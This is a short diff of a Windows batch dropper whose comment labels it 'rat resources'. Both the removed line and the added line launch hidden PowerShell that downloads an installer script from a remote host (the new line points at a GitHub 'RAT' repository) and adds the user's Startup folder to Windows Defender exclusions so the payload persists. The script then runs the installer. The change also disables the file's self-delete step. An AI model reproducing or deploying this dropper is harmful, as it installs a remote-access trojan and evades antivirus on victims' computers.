@@ -33,10 +33,9 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 REM rat resources
-powershell
-powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri httposmodiumCS/MK01-O.ps1 -OutFile installer.ps1; Add-MpPreference -ExclusionPath "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; ./installer.ps1
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'raw.githubusercontent.com/birbalkr/RAT/master/files/installer.ps1' -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; ./installer.ps1
 
 @REM self delete
-del wget.cmd
+@REM del wget.cmd
 
 
